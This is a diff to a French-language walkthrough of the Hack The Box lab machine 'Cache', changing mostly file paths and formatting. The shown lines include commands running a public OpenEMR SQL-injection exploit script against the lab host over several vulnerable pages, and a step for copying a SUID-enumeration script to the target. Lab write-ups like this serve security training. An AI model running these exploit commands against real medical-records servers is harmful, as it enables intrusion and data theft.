@@ -517,7 +517,7 @@ Tu cliques ensuite sur le lien `jquery/functionality.js` pour afficher le conten
 <script src="jquery/functionality.js"></script>
 ```
 
-Depuis le code source de `login.html`, tu cliques sur le lien `jquery/functionality.js` pour afficher le contenu du script.
+Voici le résultat :
 
 ![Recherche dans le fichier functionality.js](cache-htb-query-functionality-js-source.png)
 
@@ -1031,7 +1031,7 @@ python3 50017.py \
   -P 80 \
   -U '' \
   -R '/portal/add_edit_event_user.php' \
-  | tee 50017/add_edit_event_user.txt
+  | tee add_edit_event_user.txt
 ```
 
 L’option `-U ''` indique que l’installation OpenEMR est directement accessible à la racine de `hms.htb`.
@@ -1039,7 +1039,7 @@ L’option `-U ''` indique que l’installation OpenEMR est directement accessib
 La réponse est affichée dans le terminal et enregistrée en même temps dans :
 
 ```text
-50017/add_edit_event_user.txt
+add_edit_event_user.txt
 ```
 
 Le script confirme d’abord que la cible est vulnérable :
@@ -1090,7 +1090,7 @@ pages=(
 )
 
 for page in "${pages[@]}"; do
-  output="50017/${page//\//_}"
+  output="${page//\//_}"
   output="${output%.php}.txt"
 
   python3 50017.py \
@@ -1125,7 +1125,7 @@ est enregistré sous le nom :
 Comme la première ressource a déjà révélé la chaîne `Administrator`, tu recherches ce terme dans l’ensemble des fichiers récupérés :
 
 ```bash
-grep -Rni 'administrator' 50017/
+grep -ni 'administrator' *.txt
 ```
 
 La commande retourne :
@@ -1756,9 +1756,7 @@ Tu poursuis avec `suid3num.py` afin d’identifier les fichiers possédant le bi
 
 Comme le script se trouve sur Kali, tu le transfères d’abord vers la cible en suivant la recette dédiée :
 
-```text
 {{< recette "copier-fichiers-kali" >}}
-```
 
 Depuis Kali, dans le répertoire contenant `suid3num.py`, tu lances par exemple un serveur HTTP :
 
